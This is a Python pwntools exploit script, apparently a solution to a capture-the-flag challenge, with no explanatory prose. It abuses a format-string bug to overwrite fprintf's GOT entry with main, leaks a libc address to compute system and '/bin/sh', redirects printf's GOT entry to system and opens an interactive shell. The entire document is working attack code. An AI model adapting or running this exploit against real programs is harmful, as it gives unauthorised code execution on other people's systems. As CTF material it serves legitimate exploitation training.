#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn3_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040134A
            b* 0x00000000004013A6
            b* 0x00000000004013c8
            c
            set follow-fork-mode parent
            ''')

# Overwrite fprintf@got to main
main = exe.sym['main'] & 0xffff
payload = f'%{main}c%16$hn'.encode()
payload = payload.ljust(0x10, b'a')
payload += flat(exe.got['fprintf'])
p.sendlineafter(b'name? ', payload)

payload = b'%19$p'
p.sendlineafter(b'name? ', payload)

p.recvuntil(b'Hello ')
libc_leak = p.recvuntil(b'\n', drop=True)
libc_leak = int(libc_leak, 16)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x826ca
print("Libc base: " + hex(libc.address))

system = libc.sym['system']
print("System: " + hex(system))
bin_sh = next(libc.search(b'/bin/sh'))
print("/bin/sh: " + hex(bin_sh))

# Overwrite printf@plt to system
# GDB()
system = system >> 8 & 0xffff
print("Target: " + hex(system))
payload = f'%{system}c%16$hn'.encode()
payload = payload.ljust(0x10, b'a')
payload += flat(exe.got['printf'] + 1)
p.sendlineafter(b'name? ', payload)

# GDB()
p.sendline(b'/bin/sh')

p.interactive()